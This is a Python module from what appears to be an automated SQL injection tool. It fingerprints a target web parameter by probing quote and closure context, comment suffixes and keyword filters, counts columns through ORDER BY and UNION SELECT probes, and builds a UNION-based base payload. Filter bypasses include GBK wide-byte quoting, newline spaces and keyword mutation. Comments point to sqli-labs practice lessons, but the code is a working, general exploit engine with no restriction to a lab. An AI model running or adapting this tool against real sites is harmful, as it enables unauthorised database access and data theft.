"""
seqsqli/core/fingerprint.py
============================
Fingerprinting engine — auto-detect injection parameters.
"""

import re
import time
from typing import Optional

from seqsqli.config import REQUEST_DELAY
from seqsqli.core.profile import TargetProfile
from seqsqli.core.http import send_request
from seqsqli.core.response import classify_response, has_valid_output

class Fingerprinter:
    """
    Automatically detect quote char, closure, column count, and filter type.

    Detection order matters:
      1. Baseline response (what does a normal request look like?)
      2. Quote/closure (error-based: inject ' or " and look for SQL error)
      3. Suffix (does --+ work, or do we need quote-closing?)
      4. Filter detection (what keywords/chars get stripped?)
      5. Column count (using filter-aware ORDER BY / UNION SELECT probes)
      6. Injectable columns (which positions reflect in output?)
    """

    def __init__(self, target: TargetProfile, verbose: bool = True):
        self.target = target
        self.verbose = verbose
        self.baseline_resp = ""
        self.baseline_len = 0
        self.error_resp = ""    # what a SQL error response looks like

    def log(self, msg: str):
        if self.verbose:
            print(f"  [FINGERPRINT] {msg}")

    def _is_same_as_baseline(self, resp: str, threshold: int = 50) -> bool:
        """Check if response is essentially the same as baseline (no injection effect)."""
        return abs(len(resp) - self.baseline_len) < threshold

    def _has_sql_error(self, resp: str) -> bool:
        """Check if response contains SQL error indicators."""
        text = resp.lower()
        for ind in SQL_ERROR_INDICATORS:
            if ind in text:
                return True
        return False

    def _has_success_data(self, resp: str) -> bool:
        """Check if response has injection success indicators AND differs from baseline."""
        text = resp.lower()
        has_indicators = any(ind in text for ind in SUCCESS_INDICATORS)
        differs = not self._is_same_as_baseline(resp)
        return has_indicators and differs

    def _is_blocked(self, resp: str, status: int) -> bool:
        """Check if response indicates WAF/filter blocking."""
        if status in (403, 406, 429, 501):
            return True
        text = resp.lower()
        return any(ind in text for ind in WAF_INDICATORS + FILTERED_INDICATORS)

    def run(self) -> TargetProfile:
        """Run full fingerprinting sequence."""
        self.log(f"Target: {self.target.url} | param={self.target.param}")

        # Step 1: Get baseline responses
        self.baseline_resp, baseline_status = send_request(self.target, "1")
        self.baseline_len = len(self.baseline_resp)
        self.log(f"Baseline: status={baseline_status}, len={self.baseline_len}")

        # Also get a "bad id" response to compare
        bad_resp, _ = send_request(self.target, "9999999")
        time.sleep(REQUEST_DELAY)
        self.log(f"Bad-ID response: len={len(bad_resp)}")

        # Step 2: Error-based quote detection (minimal probes, filter-safe)
        self._detect_quote_closure()

        # Step 3: Detect what suffix works (--+ or # or quote-closing)
        self._detect_suffix()

        # Step 4: Filter detection (what keywords/chars get stripped?)
        self._detect_filter_type()

        # Step 5: Column count (filter-aware)
        self._detect_columns()

        # Step 6: Injectable columns
        self._detect_injectable_columns()

        # Step 7: Build base payload
        self._build_base_payload()

        self.log(f"Profile complete:")
        self.log(f"  quote={self.target.quote!r}  closure={self.target.closure!r}")
        self.log(f"  suffix={self.target.suffix!r}  cols={self.target.columns}")
        self.log(f"  injectable={self.target.injectable_cols}")
        self.log(f"  filter={self.target.filter_type}")
        self.log(f"  base_payload={self.target.base_payload}")

        return self.target

    def _detect_quote_closure(self):
        """
        Error-based detection: inject just a quote char and see if it triggers
        a SQL error. This avoids using keywords that might get filtered.

        Test: id=1'  -> SQL error means single-quote context
        Test: id=1"  -> SQL error means double-quote context
        Test: id=1   (already baseline) -> no error means we test numeric
        """
        # Test single quote
        resp_sq, _ = send_request(self.target, "1'")
        time.sleep(REQUEST_DELAY)
        sq_error = self._has_sql_error(resp_sq)

        # Test double quote
        resp_dq, _ = send_request(self.target, '1"')
        time.sleep(REQUEST_DELAY)
        dq_error = self._has_sql_error(resp_dq)

        self.log(f"Quote probe: single-quote error={sq_error}, double-quote error={dq_error}")

        if sq_error and not dq_error:
            self.target.quote = "'"
            self._detect_closure("'")
        elif dq_error and not sq_error:
            self.target.quote = '"'
            self._detect_closure('"')
        elif sq_error and dq_error:
            # Both cause error — try single quote first (more common)
            self.target.quote = "'"
            self._detect_closure("'")
        else:
            # Neither causes error — could be numeric injection or GBK
            # Test numeric: id=1 AND 1=1 vs id=1 AND 1=2
            resp_t, _ = send_request(self.target, "1 AND 1=1")
            resp_f, _ = send_request(self.target, "1 AND 1=2")
            time.sleep(REQUEST_DELAY)

            if abs(len(resp_t) - len(resp_f)) > 20:
                self.target.quote = ""
                self.target.closure = ""
                self.log(f"Detected: numeric injection (no quote)")
                return

            # Test GBK bypass
            resp_gbk, _ = send_request(self.target, "1%bf%27")
            time.sleep(REQUEST_DELAY)
            if self._has_sql_error(resp_gbk):
                self.target.quote = "%bf%27"
                self.target.closure = ""
                self.log(f"Detected: GBK wide-byte bypass (quote=%bf%27)")
                return

            # Last resort: check if the page just always shows success
            # (sqli-labs pages often show "you are in" even for normal queries)
            # Fall back to single quote as most common
            self.log(f"WARNING: Could not confirm injection type. Defaulting to single-quote.")
            self.target.quote = "'"
            self.target.closure = ""

    def _detect_closure(self, quote: str):
        """Detect closure characters: ), )), etc. after the quote.
        Test: id=1')-- vs id=1'))-- etc, looking for non-error responses."""
        closures = ["", ")", "))", "')"]

        for closure in closures:
            # Use a simple tautology to test if the closure is right
            # Try multiple suffixes since we don't know which works yet
            for suffix in ["--+", "#", f" AND {quote}1{quote}={quote}1"]:
                test = f"1{quote}{closure} AND 1=1{suffix}"
                resp, status = send_request(self.target, test)
                time.sleep(REQUEST_DELAY)

                if not self._has_sql_error(resp) and not self._is_blocked(resp, status):
                    # This didn't cause error — could be valid closure
                    # Verify with false condition
                    test_f = f"1{quote}{closure} AND 1=2{suffix}"
                    resp_f, _ = send_request(self.target, test_f)
                    time.sleep(REQUEST_DELAY)

                    # If true and false give different responses, we confirmed it
                    if abs(len(resp) - len(resp_f)) > 20 or self._has_sql_error(resp_f):
                        self.target.quote = quote
                        self.target.closure = closure
                        self.log(f"Detected: quote={quote!r}, closure={closure!r} (via suffix {suffix!r})")
                        return

        # If no closure gave differential, use no closure
        self.target.quote = quote
        self.target.closure = ""
        self.log(f"Detected: quote={quote!r}, closure='' (no closure confirmed)")

    def _detect_suffix(self):
        """
        Detect which suffix (comment terminator) works.
        Try: --+  #  ;%00  and quote-closing fallback.
        This is critical because some filters strip -- and #.

        When standard comment suffixes all fail (e.g. Less-27 strips -,#,space),
        we fall back to a quote-closing suffix where the last column value
        absorbs the trailing quote from the original query.
        """
        q = self.target.quote
        c = self.target.closure

        suffix_candidates = [
            ("--+",    "double-dash comment"),
            ("-- -",   "double-dash-space"),
            ("#",      "hash comment"),
            ("%23",    "url-encoded hash"),
            (";%00",   "null byte"),
        ]

        for suffix, desc in suffix_candidates:
            test_t = f"1{q}{c} AND 1=1{suffix}"
            test_f = f"1{q}{c} AND 1=2{suffix}"
            resp_t, st_t = send_request(self.target, test_t)
            time.sleep(REQUEST_DELAY)
            resp_f, st_f = send_request(self.target, test_f)
            time.sleep(REQUEST_DELAY)

            t_err = self._has_sql_error(resp_t)
            f_err = self._has_sql_error(resp_f)

            # Good suffix: true condition works, false condition differs
            if not t_err and not self._is_blocked(resp_t, st_t):
                if abs(len(resp_t) - len(resp_f)) > 20 or f_err:
                    self.target.suffix = suffix
                    self.log(f"Suffix detected: {suffix!r} ({desc})")
                    return

        # Try with %0a (newline) as space alternative for suffix candidates
        # This handles filters that strip normal spaces (e.g. Less-26, 27)
        for suffix, desc in suffix_candidates:
            test_t = f"1{q}{c}%0aAND%0a1=1{suffix}"
            test_f = f"1{q}{c}%0aAND%0a1=2{suffix}"
            resp_t, st_t = send_request(self.target, test_t)
            time.sleep(REQUEST_DELAY)
            resp_f, st_f = send_request(self.target, test_f)
            time.sleep(REQUEST_DELAY)

            t_err = self._has_sql_error(resp_t)
            f_err = self._has_sql_error(resp_f)

            if not t_err and not self._is_blocked(resp_t, st_t):
                if abs(len(resp_t) - len(resp_f)) > 20 or f_err:
                    self.target.suffix = suffix
                    self.log(f"Suffix detected: {suffix!r} ({desc}) [via newline spaces]")
                    return

        # If no comment suffix works, try quote-closing suffix
        # For id='...' queries we close with: AND 'x'='x
        if q and q not in ("%bf%27",):
            # Try with normal spaces first
            close_suffix = f" AND {q}1{q}={q}1"
            test_t = f"1{q}{c}{close_suffix}"
            resp_t, st_t = send_request(self.target, test_t)
            time.sleep(REQUEST_DELAY)

            if not self._has_sql_error(resp_t) and not self._is_blocked(resp_t, st_t):
                self.target.suffix = close_suffix
                self.log(f"Suffix detected: quote-closing ({close_suffix!r})")
                return

            # Try with newline spaces
            close_suffix_nl = f"%0aAND%0a{q}1{q}={q}1"
            test_t = f"1{q}{c}{close_suffix_nl}"
            resp_t, st_t = send_request(self.target, test_t)
            time.sleep(REQUEST_DELAY)

            if not self._has_sql_error(resp_t) and not self._is_blocked(resp_t, st_t):
                # Mark suffix as "quote_close" — _build_base_payload will handle it
                self.target.suffix = "QUOTE_CLOSE"
                self.log(f"Suffix detected: quote-closing (spaces filtered, need newline bypass)")
                return

        self.log(f"WARNING: No suffix confirmed, defaulting to QUOTE_CLOSE for safety")
        if q:
            self.target.suffix = "QUOTE_CLOSE"
        else:
            self.target.suffix = "--+"

    def _detect_filter_type(self):
        """
        Probe what gets filtered/blocked.
        Uses minimal payloads that close the query properly.
        Compares response against SQL-error to distinguish
        'filtered keyword' from 'just a syntax error'.
        """
        q = self.target.quote
        c = self.target.closure
        suffix = self.target.suffix

        # Build test payloads — each tests one filter category
        probes = {}

        # Test spaces: use normal space in a valid tautology
        probes["space"] = f"1{q}{c} AND 1=1{suffix}"

        # Test OR keyword
        probes["or"] = f"1{q}{c} OR 1=1{suffix}"

        # Test AND keyword (if space works)
        probes["and"] = f"1{q}{c} AND 1=1{suffix}"

        # Test inline comments /**/
        probes["comment"] = f"1{q}{c}/**/AND/**/1=1{suffix}"

        # Test -- comment (different from suffix test because we test in-payload)
        probes["dash_comment"] = f"1{q}{c}--"

        # Test UNION keyword
        probes["union"] = f"0{q}{c} UNION ALL SELECT NULL{suffix}"

        # Test SELECT keyword
        probes["select"] = f"0{q}{c} UNION SELECT NULL{suffix}"

        filters_detected = set()
        probe_results = {}

        for name, payload in probes.items():
            resp, status = send_request(self.target, payload)
            time.sleep(REQUEST_DELAY)

            is_err = self._has_sql_error(resp)
            is_blocked = self._is_blocked(resp, status)
            same_as_baseline = self._is_same_as_baseline(resp)

            probe_results[name] = {
                "error": is_err, "blocked": is_blocked,
                "same_baseline": same_as_baseline, "len": len(resp)
            }

            if is_blocked:
                filters_detected.add(name)
            elif is_err:
                # A SQL error on a valid tautology probe means the filter
                # likely broke the payload (stripped keywords or operators).
                if name == "space":
                    # A tautology like 1' AND 1=1--+ should not error unless
                    # spaces/dashes are stripped, breaking the SQL syntax.
                    filters_detected.add(name)
                elif name in ("union", "select"):
                    if name == "union" and "union" not in resp.lower():
                        filters_detected.add(name)
                    elif name == "select" and "select" not in resp.lower():
                        filters_detected.add(name)
                elif name == "comment" and "/**/" not in resp:
                    filters_detected.add(name)
                elif name == "dash_comment":
                    # If -- causes a SQL error, the dashes are likely stripped
                    filters_detected.add(name)

        # Additional check: test if dashes and hash are individually stripped
        # (Less-27 strips '-' and '#' as individual characters)
        resp_dash, _ = send_request(self.target, f"1{q}{c}")
        time.sleep(REQUEST_DELAY)
        resp_with_dash, _ = send_request(self.target, f"1-{q}{c}")
        time.sleep(REQUEST_DELAY)

        # If the response for "1'" and "1-'" is the same, dash is stripped
        # (because if dash weren't stripped, "1-'" would be different SQL)
        # Actually, a simpler heuristic: check the Hint output if available
        hint_probe, _ = send_request(self.target, f"test-string{q}")
        time.sleep(REQUEST_DELAY)
        if "test-string" in hint_probe.lower() and "teststring" in hint_probe.lower():
            # The dash was removed from the echo
            filters_detected.add("dash_comment")
            self.log(f"Detected: individual dash '-' stripping")

        self.log(f"Filter probes: {probe_results}")
        self.log(f"Filters detected: {filters_detected}")

        # Classify
        has_union = "union" in filters_detected
        has_select = "select" in filters_detected
        has_comment = "comment" in filters_detected
        has_space = "space" in filters_detected
        has_or = "or" in filters_detected
        has_and = "and" in filters_detected
        has_dash = "dash_comment" in filters_detected

        if not filters_detected:
            self.target.filter_type = "none"
        elif has_or and not has_union and not has_comment:
            self.target.filter_type = "or_and"
        elif (has_comment or has_space) and (has_or or has_and):
            self.target.filter_type = "comments_spaces_or_and"
        elif has_union or has_select:
            if has_comment or has_space:
                self.target.filter_type = "union_select_comments_spaces"
            else:
                self.target.filter_type = "union_select_combined"
        elif has_comment or has_space:
            self.target.filter_type = "comments_spaces_or_and"
        else:
            self.target.filter_type = "unknown"

        self.log(f"Filter type: {self.target.filter_type}")

    def _build_probe_payload(self, keyword_payload: str) -> str:
        """Build a probe payload using bypass techniques based on detected filters.
        This is used by column detection and injectable column detection."""
        ft = self.target.filter_type

        if ft == "none":
            return keyword_payload

        result = keyword_payload

        # Apply bypass based on filter type
        if ft in ("union_select_comments_spaces", "union_select_combined"):
            # Need to bypass UNION/SELECT filtering AND space filtering
            result = MutationEngine.case_variation(result)  # mixed case
            result = MutationEngine.newline_space(result)    # newline for spaces
        elif ft == "comments_spaces_or_and":
            result = MutationEngine.newline_space(result)
            result = MutationEngine.nested_or(result)
            result = MutationEngine.nested_and(result)
        elif ft == "or_and":
            result = MutationEngine.nested_or(result)
            result = MutationEngine.nested_and(result)

        return result

    def _detect_columns(self):
        """Detect column count using ORDER BY, with filter-aware probes."""
        q = self.target.quote
        c = self.target.closure
        suffix = self.target.suffix
        ft = self.target.filter_type

        is_quote_close = (suffix == "QUOTE_CLOSE")

        # Phase 1: ORDER BY technique (most reliable)
        # Note: ORDER BY cannot use quote-closing, so we skip it when
        # the only available suffix is QUOTE_CLOSE.
        if not is_quote_close:
            last_success_n = 0
            for n in range(1, 20):
                raw = f"1{q}{c} ORDER BY {n}{suffix}"
                payload = self._build_probe_payload(raw)
                resp, status = send_request(self.target, payload)
                time.sleep(REQUEST_DELAY)

                is_err = self._has_sql_error(resp)
                is_blocked = self._is_blocked(resp, status)

                if is_err or is_blocked:
                    if last_success_n > 0:
                        self.target.columns = last_success_n
                        self.log(f"Column count: {last_success_n} (ORDER BY {n} failed)")
                        return
                    elif n == 1:
                        self.log(f"ORDER BY 1 failed, trying UNION SELECT approach...")
                        break
                    else:
                        self.target.columns = n - 1
                        self.log(f"Column count: {n - 1} (ORDER BY {n} failed)")
                        return
                else:
                    last_success_n = n
        else:
            self.log(f"QUOTE_CLOSE suffix: skipping ORDER BY, going to UNION SELECT...")

        # Phase 2: UNION SELECT NULL approach with bypass
        if not is_quote_close:
            for n in range(1, 15):
                cols = ",".join(["NULL"] * n)
                raw = f"0{q}{c} UNION SELECT {cols}{suffix}"
                payload = self._build_probe_payload(raw)
                resp, status = send_request(self.target, payload)
                time.sleep(REQUEST_DELAY)

                is_err = self._has_sql_error(resp)
                is_blocked = self._is_blocked(resp, status)

                if not is_err and not is_blocked and not self._is_same_as_baseline(resp, threshold=20):
                    self.target.columns = n
                    self.log(f"Column count: {n} (UNION SELECT NULL succeeded)")
                    return

                if not is_err and not is_blocked:
                    marker_cols = []
                    for i in range(1, n + 1):
                        marker_cols.append(f"0x{f'PROBE{i}'.encode().hex()}")
                    raw2 = f"0{q}{c} UNION SELECT {','.join(marker_cols)}{suffix}"
                    payload2 = self._build_probe_payload(raw2)
                    resp2, _ = send_request(self.target, payload2)
                    time.sleep(REQUEST_DELAY)

                    if any(f"PROBE{i}" in resp2 for i in range(1, n + 1)):
                        self.target.columns = n
                        self.log(f"Column count: {n} (confirmed via marker reflection)")
                        return

        # Phase 3: UNION SELECT with quote-closing last column
        # This is the primary strategy when suffix is QUOTE_CLOSE,
        # and a fallback otherwise.
        if q:
            self.log(f"Trying column detection with quote-closing suffix...")
            for n in range(1, 10):
                cols_parts = []
                for i in range(1, n + 1):
                    if i == n:
                        cols_parts.append(f"{q}{i}")  # last col closes the quote
                    else:
                        cols_parts.append(str(i))
                raw = f"0{q}{c} UNION SELECT {','.join(cols_parts)}"
                payload = self._build_probe_payload(raw)
                resp, status = send_request(self.target, payload)
                time.sleep(REQUEST_DELAY)

                if not self._has_sql_error(resp) and not self._is_blocked(resp, status):
                    # Verify this is actual injection, not just a non-error page
                    if not self._is_same_as_baseline(resp, threshold=20):
                        self.target.columns = n
                        self.log(f"Column count: {n} (with quote-closing last column)")
                        return
                    # Also try marker-based verification
                    marker_parts = []
                    for i in range(1, n + 1):
                        if i == n:
                            marker_parts.append(f"{q}{i}")
                        else:
                            marker_parts.append(f"0x{f'PROBE{i}'.encode().hex()}")
                    raw2 = f"0{q}{c} UNION SELECT {','.join(marker_parts)}"
                    payload2 = self._build_probe_payload(raw2)
                    resp2, _ = send_request(self.target, payload2)
                    time.sleep(REQUEST_DELAY)
                    if any(f"PROBE{i}" in resp2 for i in range(1, n)):
                        self.target.columns = n
                        self.log(f"Column count: {n} (quote-close + marker confirmed)")
                        return

        self.target.columns = 3  # common default for sqli-labs
        self.log(f"Column count: defaulting to {self.target.columns}")

    def _detect_injectable_columns(self):
        """Find which columns are reflected in the response using marker values."""
        if self.target.columns == 0:
            return

        q = self.target.quote
        c = self.target.closure
        suffix = self.target.suffix
        n = self.target.columns

        is_quote_close = (suffix == "QUOTE_CLOSE")

        if not is_quote_close:
            # Standard approach: all columns get hex markers
            cols = []
            for i in range(1, n + 1):
                cols.append(f"0x{f'DEADCOL{i}'.encode().hex()}")

            raw = f"0{q}{c} UNION SELECT {','.join(cols)}{suffix}"
            payload = self._build_probe_payload(raw)
            resp, status = send_request(self.target, payload)
            time.sleep(REQUEST_DELAY)

            injectable = []
            for i in range(1, n + 1):
                if f"DEADCOL{i}" in resp:
                    injectable.append(i)

            if injectable:
                self.target.injectable_cols = injectable
                self.log(f"Injectable columns: {self.target.injectable_cols}")
                return

        # Quote-closing approach: last column is reserved for quote-close
        cols2 = []
        for i in range(1, n + 1):
            if i == n:
                cols2.append(f"{q}{i}")
            else:
                cols2.append(f"0x{f'DEADCOL{i}'.encode().hex()}")
        raw2 = f"0{q}{c} UNION SELECT {','.join(cols2)}"
        payload2 = self._build_probe_payload(raw2)
        resp2, _ = send_request(self.target, payload2)
        time.sleep(REQUEST_DELAY)

        injectable = []
        for i in range(1, n):  # exclude last col (it's the quote-closer)
            if f"DEADCOL{i}" in resp2:
                injectable.append(i)

        self.target.injectable_cols = injectable if injectable else list(range(2, min(n + 1, 4)))
        self.log(f"Injectable columns: {self.target.injectable_cols}")

    def _build_base_payload(self):
        """Build the UNION SELECT base payload dynamically.

        When the suffix is ``QUOTE_CLOSE`` (all comment suffixes are
        filtered), the last SELECT column absorbs the trailing quote
        from the original query.  Example for 3-column, single-quote:

            0' UNION SELECT 1,2,'3

        The trailing ``'3`` merges with the query's own ``'`` → ``'3'``.
        """
        q = self.target.quote
        c = self.target.closure
        suffix = self.target.suffix
        n = self.target.columns

        if n == 0:
            if self.target.method == "POST":
                self.target.base_payload = f"admin{q}{c} {suffix}"
            else:
                self.target.base_payload = f"1{q}{c} AND 1=1{suffix}"
            return

        cols = ",".join(str(i) for i in range(1, n + 1))

        # Check if we need quote-closing suffix (when comment suffixes don't work)
        needs_quote_close = (
            suffix == "QUOTE_CLOSE"
            or (suffix not in ("--+", "-- -", "#", "%23", ";%00") and q)
        )

        if needs_quote_close and q:
            # Last column closes the quote context
            # e.g.: 0' UNION SELECT 1,2,'3  (the '3 closes the original query's ')
            col_parts = []
            for i in range(1, n + 1):
                if i == n:
                    col_parts.append(f"{q}{i}")
                else:
                    col_parts.append(str(i))
            self.target.base_payload = f"0{q}{c} UNION SELECT {','.join(col_parts)}"
            self.target.suffix = "QUOTE_CLOSE"  # normalize
        else:
            self.target.base_payload = f"0{q}{c} UNION SELECT {cols}{suffix}"

        self.log(f"Base payload: {self.target.base_payload}")


